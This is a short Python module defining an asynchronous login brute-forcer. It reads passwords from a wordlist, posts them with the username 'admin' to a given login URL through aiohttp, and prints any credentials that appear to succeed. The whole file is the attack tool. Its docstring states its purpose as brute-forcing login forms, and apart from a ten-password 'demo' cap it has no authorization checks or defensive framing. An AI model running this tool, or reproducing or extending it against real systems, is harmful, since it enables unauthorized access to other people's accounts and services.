import logging
import aiohttp
import asyncio
from typing import Dict, List
from ratelimit import limits, sleep_and_retry
from rich.console import Console
import validators

logger = logging.getLogger(__name__)
console = Console()

class LoginBruteforcer:
    """Performs brute-force attacks on login forms."""
    
    def __init__(self, config: Dict):
        self.config = config
    
    @sleep_and_retry
    @limits(calls=5, period=1)
    async def attempt_login(self, session: aiohttp.ClientSession, url: str, username: str, password: str) -> bool:
        """Attempt a login with given credentials."""
        try:
            payload = {"username": username, "password": password}
            async with session.post(url, data=payload) as response:
                if response.status == 200 and "login failed" not in (await response.text()).lower():
                    console.print(f"[green][+] Success: {username}:{password}[/green]")
                    return True
                return False
        except Exception as e:
            logger.error(f"Login attempt failed: {e}")
            return False
    
    async def brute_force(self, url: str, wordlist: str) -> List[Dict]:
        """Brute-force a login form."""
        if not validators.url(url):
            raise ValueError("Invalid URL")
        results = []
        try:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f]
            async with aiohttp.ClientSession() as session:
                tasks = []
                for password in passwords[:10]:  # Limit for demo
                    tasks.append(self.attempt_login(session, url, "admin", password))
                successes = await asyncio.gather(*tasks)
                for password, success in zip(passwords[:10], successes):
                    if success:
                        results.append({"username": "admin", "password": password})
        except Exception as e:
            logger.error(f"Brute force failed: {e}")
        return results